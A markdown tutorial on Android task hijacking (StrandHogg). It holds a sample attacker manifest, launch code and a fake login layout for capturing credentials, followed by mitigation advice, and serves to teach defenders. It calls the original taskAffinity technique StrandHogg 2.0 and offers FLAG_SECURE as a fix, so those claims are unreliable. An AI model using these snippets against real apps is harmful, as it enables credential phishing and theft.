# Task Hijacking (Strandhogg)

## Overview

StrandHogg 2.0 is a critical vulnerability affecting Android devices. It allows malicious apps to pose as legitimate apps, enabling attackers to perform various malicious activities such as stealing credentials, spying on users, and more. This vulnerability is a more advanced version of the original StrandHogg vulnerability, which was first discovered in 2019.

## Key Concepts

### Task Affinity
Task affinity is an Android feature that defines how activities are grouped into tasks. By default, all activities in the same application belong to the same task. However, an app can specify a different task affinity, causing its activities to be placed in a different task.

### Task Hijacking
Task hijacking involves taking control of a legitimate app's task by inserting a malicious activity into it. Once hijacked, the malicious activity can impersonate the legitimate activity, fooling the user into interacting with it.

## How StrandHogg 2.0 Works

StrandHogg 2.0 leverages a combination of task affinity manipulation and intent handling to perform task hijacking. Here’s how it works:

1. **Malicious App Installation**: The attacker convinces the user to install a malicious app, often disguised as a legitimate or harmless app.

2. **Task Hijacking**: The malicious app declares a task affinity matching that of the target app. When the user interacts with the legitimate app, the malicious app's activity is launched instead.

3. **Impersonation**: The malicious activity can look exactly like the legitimate app's activity, tricking the user into entering sensitive information like passwords or payment details.

4. **Data Theft**: Once the user enters their credentials or other sensitive data, the malicious app captures and sends it to the attacker.

### Code Example

Let's look at a simplified example of how an attacker could exploit StrandHogg 2.0:

#### Manifest of the Malicious App
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <application
        android:allowBackup="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        android:icon="@mipmap/ic_launcher"
        android:label="hijacking"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.Strandhogg"
        tools:targetApi="31">

        <!-- Malicious Activity configuration -->
        <activity
            android:name=".MaliciousActivity"
            android:exported="true"
            android:taskAffinity="com.target.app"
            android:launchMode="singleTask"
            android:allowTaskReparenting="true"
            android:excludeFromRecents="true">
            <intent-filter>
                <!-- Intent filter for the malicious activity -->
                <action android:name="android.intent.action.VIEW" />
            </intent-filter>
        </activity>

        <!-- MainActivity configuration -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTask"
            android:taskAffinity="com.target.app"
            android:excludeFromRecents="true">

            <!-- Intent filter to match the target app's activity -->
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest>

```
- `taskAffinity`: Set to the package name of the target app, making the malicious activity part of the target app's task.
- `launchMode`: singleTask ensures that the activity is the only one running in its task.
- `allowTaskReparenting`: Allows the activity to move to another task if it matches the task affinity.
- `excludeFromRecents`: Hides the malicious activity from the recent apps list, making it harder for the user to detect.
### Launching the Malicious Activity
```
Intent maliciousIntent = new Intent(context, MaliciousActivity.class);
maliciousIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
context.startActivity(maliciousIntent);
```
- The attacker launches the malicious activity, which is inserted into the target app's task.

### Impersonating the Target App
To make the attack more effective, the malicious activity would closely resemble the target app’s legitimate activity. This can be done by copying the UI elements of the target app.
```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent">

    <EditText
        android:id="@+id/username"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Username" />

    <EditText
        android:id="@+id/password"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Password"
        android:inputType="textPassword" />

    <Button
        android:id="@+id/login"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Login" />
</RelativeLayout>

```
- The malicious activity's layout mimics the login screen of the target app, tricking the user into entering their credentials.
- onCreate method in MainActivity:
```
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    Intent maliciousIntent = new Intent(this, MaliciousActivity.class);
    maliciousIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    startActivity(maliciousIntent);
    finish();  // Optional: Close MainActivity after starting the malicious activity
}
```
### Mitigation
To protect against StrandHogg 2.0, developers should:
1. Use `FLAG_SECURE`: Apply `FLAG_SECURE` to sensitive activities to prevent them from being captured by malicious apps.
```
getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE,
                     WindowManager.LayoutParams.FLAG_SECURE);

```
2. Restrict Task Affinity: Avoid setting a custom task affinity unless absolutely necessary. If required, ensure that it cannot be exploited by malicious apps.
3. Check for Intent Spoofing: Always validate incoming intents to ensure they come from legitimate sources.
4. Regular Security Updates: Keep your app and Android OS updated to the latest versions to benefit from the latest security patches.

## Resources
- [Promon](https://promon.co/resources/downloads/strandhogg-2-0-new-serious-android-vulnerability)
- [HackTricks](https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/android-task-hijacking)